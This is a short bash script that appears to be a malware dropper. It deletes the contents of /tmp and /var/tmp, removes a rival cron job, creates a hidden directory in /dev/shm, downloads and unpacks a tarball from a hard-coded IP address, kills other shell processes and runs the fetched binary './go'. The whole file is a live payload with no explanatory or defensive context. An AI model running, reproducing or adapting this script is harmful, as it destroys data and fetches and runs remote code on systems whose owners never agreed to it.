#!/bin/bash

rm -rf /tmp/*
rm -rf /var/tmp/*
rm -rf /etc/*hourly/gcc.sh
cd /dev/shm
mkdir .jenkins
cd .jenkins
wget 45.55.211.79/.cache/jenkins/jks2.tar.gz
curl -O 45.55.211.79/.cache/jenkins/jks2.tar.gz
tar -zxvf jks2.tar.gz
rm -rf jks2.tar.gz*
cd j2
kill -9 `ps xww|grep -v grep|grep "\-sh"|awk '{print $1}'`
sleep 2
./go

